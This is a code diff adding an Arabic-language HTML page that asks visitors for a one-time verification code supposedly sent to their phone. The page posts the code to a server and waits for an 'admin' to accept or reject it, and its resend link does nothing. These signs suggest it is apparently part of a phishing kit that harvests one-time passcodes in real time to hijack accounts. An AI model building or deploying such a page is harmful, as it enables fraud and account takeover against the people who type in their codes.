@@ -1,0 +1,264 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>رمز التحقق</title>
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800&display=swap" rel="stylesheet">
+    <style>
+        :root { --green: #1a6e2e; --green-dark: #145524; --dark: #1a1a1a; --gray: #666; --white: #ffffff; }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Cairo', sans-serif;
+            background: var(--white);
+            color: var(--dark);
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+        .header {
+            background: #1b2a1b;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 14px 20px;
+        }
+        .header-title { color: var(--white); font-size: 18px; font-weight: 700; }
+
+        .code-container {
+            flex: 1;
+            padding: 40px 24px;
+            max-width: 500px;
+            margin: 0 auto;
+            width: 100%;
+        }
+        .lock-icon {
+            width: 70px; height: 70px;
+            background: #e8f5ec;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 20px;
+        }
+        .lock-icon svg { width: 34px; height: 34px; stroke: var(--green); fill: none; stroke-width: 2; }
+
+        .code-title {
+            font-size: 24px; font-weight: 800;
+            color: var(--green); text-align: center;
+            margin-bottom: 8px;
+        }
+        .code-sub {
+            font-size: 15px; color: #999;
+            text-align: center; margin-bottom: 30px;
+            line-height: 1.8;
+        }
+
+        .error-msg {
+            display: none;
+            background: #fff0f0;
+            border: 2px solid #e74c3c;
+            border-radius: 12px;
+            padding: 14px 18px;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+        .error-msg span {
+            color: #e74c3c;
+            font-size: 16px;
+            font-weight: 800;
+        }
+        .error-msg.show { display: block; }
+
+        .form-group { margin-bottom: 18px; }
+        .form-group label {
+            display: block;
+            font-size: 15px; font-weight: 700;
+            color: var(--dark);
+            margin-bottom: 8px;
+            text-align: right;
+        }
+        .input-wrap input {
+            width: 100%;
+            padding: 15px 16px;
+            border: 1.5px solid #ccc;
+            border-radius: 14px;
+            font-size: 22px;
+            font-family: 'Cairo', sans-serif;
+            background: var(--white);
+            color: var(--dark);
+            outline: none;
+            text-align: center;
+            letter-spacing: 8px;
+            font-weight: 700;
+            direction: ltr;
+            transition: border-color 0.2s;
+        }
+        .input-wrap input:focus { border-color: var(--green); }
+        .input-wrap input.error-border { border-color: #e74c3c; }
+
+        .submit-btn {
+            width: 100%;
+            padding: 17px;
+            background: var(--green);
+            color: var(--white);
+            border: none;
+            border-radius: 50px;
+            font-size: 18px;
+            font-weight: 700;
+            font-family: 'Cairo', sans-serif;
+            cursor: pointer;
+            margin-top: 10px;
+            transition: background 0.2s;
+        }
+        .submit-btn:hover { background: var(--green-dark); }
+        .submit-btn:disabled { background: #aaa; cursor: default; }
+
+        .resend {
+            text-align: center;
+            margin-top: 20px;
+            font-size: 14px;
+            color: #999;
+        }
+        .resend a {
+            color: var(--green);
+            font-weight: 700;
+            text-decoration: underline;
+            cursor: pointer;
+        }
+
+        /* Loading overlay */
+        .loading-overlay {
+            display: none;
+            position: fixed; inset: 0;
+            background: rgba(255,255,255,0.9);
+            z-index: 1000;
+            align-items: center;
+            justify-content: center;
+            flex-direction: column;
+        }
+        .loading-overlay.show { display: flex; }
+        .lo-spinner {
+            width: 50px; height: 50px;
+            border: 4px solid #e0e0e0;
+            border-top: 4px solid var(--green);
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-bottom: 16px;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        .lo-text { font-size: 16px; color: var(--green); font-weight: 700; }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <span class="header-title">رمز التحقق</span>
+    </div>
+
+    <div class="code-container">
+        <div class="lock-icon">
+            <svg viewBox="0 0 24 24"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
+        </div>
+        <div class="code-title">أدخل رمز التحقق</div>
+        <div class="code-sub">تم إرسال رمز التحقق إلى رقم هاتفك المسجل</div>
+
+        <div class="error-msg" id="errorMsg">
+            <span>الرمز غير صحيح</span>
+        </div>
+
+        <form onsubmit="return false;">
+            <div class="form-group">
+                <label>رمز التحقق</label>
+                <div class="input-wrap">
+                    <input type="text" id="codeInput" inputmode="numeric" maxlength="6" autocomplete="one-time-code" placeholder="------">
+                </div>
+            </div>
+            <button type="submit" class="submit-btn" id="submitBtn" onclick="submitCode()">تأكيد</button>
+        </form>
+
+        <div class="resend">
+            لم يصلك الرمز؟ <a onclick="resendCode()">إعادة الإرسال</a>
+        </div>
+    </div>
+
+    <!-- Loading overlay for after code submit -->
+    <div class="loading-overlay" id="loadingOverlay">
+        <div class="lo-spinner"></div>
+        <div class="lo-text">جاري التحقق من الرمز...</div>
+    </div>
+
+    <script>
+        var params = new URLSearchParams(window.location.search);
+        var sid = params.get('id');
+        var hasError = params.get('error');
+
+        if (!sid) window.location.href = 'login.html';
+
+        if (hasError === '1') {
+            document.getElementById('errorMsg').classList.add('show');
+            document.getElementById('codeInput').classList.add('error-border');
+        }
+
+        function submitCode() {
+            var code = document.getElementById('codeInput').value.trim();
+            if (!code) return;
+
+            document.getElementById('errorMsg').classList.remove('show');
+            document.getElementById('codeInput').classList.remove('error-border');
+            document.getElementById('submitBtn').disabled = true;
+
+            fetch('/api/submit-code/' + sid, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ code: code })
+            })
+            .then(function(r) { return r.json(); })
+            .then(function(d) {
+                if (d.ok) {
+                    document.getElementById('loadingOverlay').classList.add('show');
+                    pollAfterCode();
+                }
+            })
+            .catch(function() {
+                document.getElementById('submitBtn').disabled = false;
+            });
+        }
+
+        function pollAfterCode() {
+            var interval = setInterval(function() {
+                fetch('/api/status/' + sid)
+                    .then(function(r) { return r.json(); })
+                    .then(function(d) {
+                        if (d.status === 'accepted') {
+                            clearInterval(interval);
+                            document.getElementById('loadingOverlay').classList.remove('show');
+                            document.getElementById('codeInput').value = '';
+                            document.getElementById('submitBtn').disabled = false;
+                            // Admin accepted the code — could redirect to success or stay
+                        } else if (d.status === 'rejected') {
+                            clearInterval(interval);
+                            document.getElementById('loadingOverlay').classList.remove('show');
+                            document.getElementById('codeInput').value = '';
+                            document.getElementById('submitBtn').disabled = false;
+                            document.getElementById('errorMsg').classList.add('show');
+                            document.getElementById('codeInput').classList.add('error-border');
+                        }
+                    })
+                    .catch(function() {});
+            }, 2000);
+        }
+
+        function resendCode() {
+            // Visual feedback only
+            document.getElementById('errorMsg').classList.remove('show');
+            document.getElementById('codeInput').classList.remove('error-border');
+            document.getElementById('codeInput').value = '';
+            document.getElementById('codeInput').focus();
+        }
+
+        document.getElementById('codeInput').addEventListener('keydown', function(e) {
+            if (e.key === 'Enter') submitCode();
+        });
+    </script>
+</body>
+</html>
